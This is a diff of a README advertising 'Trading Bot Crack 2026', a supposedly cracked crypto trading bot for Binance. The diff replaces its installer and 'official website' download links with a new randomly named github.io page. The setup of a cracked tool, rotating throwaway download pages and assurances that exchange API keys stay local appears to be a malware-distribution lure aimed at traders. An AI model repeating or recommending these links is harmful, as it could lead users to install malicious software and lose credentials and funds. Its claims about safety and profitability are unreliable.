@@ -2,7 +2,7 @@
 
 Trading Bot Crack 2026 is a comprehensive cryptocurrency trading tool designed for both beginners and advanced users. It integrates AI-driven strategies, grid bots, DCA bots, and scalping algorithms to automate trading across multiple pairs on exchanges like Binance. This suite aims to enhance trading efficiency and profitability with minimal manual intervention.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,6 +47,6 @@ A: API keys are stored locally with encryption, and the tool does not transmit s
 
 For the latest version and more details, visit the official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This suite is designed to empower traders with advanced automation, making it easier to navigate the volatile crypto markets. Remember to trade responsibly and start with small investments to understand the bot's behavior.
